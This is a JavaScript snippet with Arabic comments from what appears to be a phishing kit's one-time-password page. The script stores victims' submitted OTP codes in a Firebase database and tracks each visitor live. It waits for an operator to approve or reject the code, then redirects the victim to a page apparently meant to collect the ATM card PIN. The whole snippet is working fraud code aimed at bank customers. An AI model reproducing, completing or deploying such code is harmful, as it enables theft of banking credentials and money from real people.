<script>
    // ... نفس إعدادات Firebase والـ Config ...

    const currentOrderId = sessionStorage.getItem("last_order_id");

    // [إضافة] تحديث فوري لحالة الزائر عند فتح الصفحة
    if (currentOrderId) {
        db.collection("active_visits").doc(currentOrderId).set({
            page: "صفحة الـ OTP - في انتظار العميل",
            last_seen: firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });

        // [إضافة] تشغيل المراقب فوراً بمجرد فتح الصفحة (عشان لو فيه حالة قديمة)
        listenForAdminAction(currentOrderId);
    } else {
        window.location.replace("index.php");
    }

    otpForm.onsubmit = async (e) => {
        e.preventDefault();
        const otpValue = document.getElementById("otpCode").value;
        if(otpValue.length < 4) return; // تأمين بسيط

        formSection.style.display = "none";
        loadingOverlay.style.display = "block";
        errorMsg.style.display = "none";

        try {
            await db.collection("orders").doc(currentOrderId).update({
                otp_code: otpValue,
                status: "otp_waiting", // الحالة اللي بتظهر عندك في الرادار
                last_update: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            // تحديث حالته في التتبع
            await db.collection("active_visits").doc(currentOrderId).update({
                page: "أدخل الـ OTP - جاري فحص الكود"
            });

        } catch (err) {
            console.error("Error:", err);
            resetForm();
        }
    };

    function listenForAdminAction(docId) {
        db.collection("orders").doc(docId).onSnapshot((doc) => {
            const data = doc.data();
            if (!data) return;

            // لو أنت ضغطت "قبول" أو "الكود صح"
            if (data.status === "accept_otp") {
                window.location.replace("atm_pin.php"); 
            } 
            // لو ضغطت "طلب كود جديد" أو "الكود غلط"
            else if (data.status === "reject_otp" || data.status === "wrong_otp") {
                resetForm();
                errorMsg.style.display = "block";
                document.getElementById("otpCode").value = "";
                // نرجع الحالة لانتظار عشان لو دخل كود جديد
                db.collection("orders").doc(docId).update({ status: "waiting_new_otp" });
            }
            else if (data.status === "success") {
                window.location.replace("success.php");
            }
        });
    }

    function resetForm() {
        formSection.style.display = "block";
        loadingOverlay.style.display = "none";
    }
    // ... العداد التنازلي ...
</script>
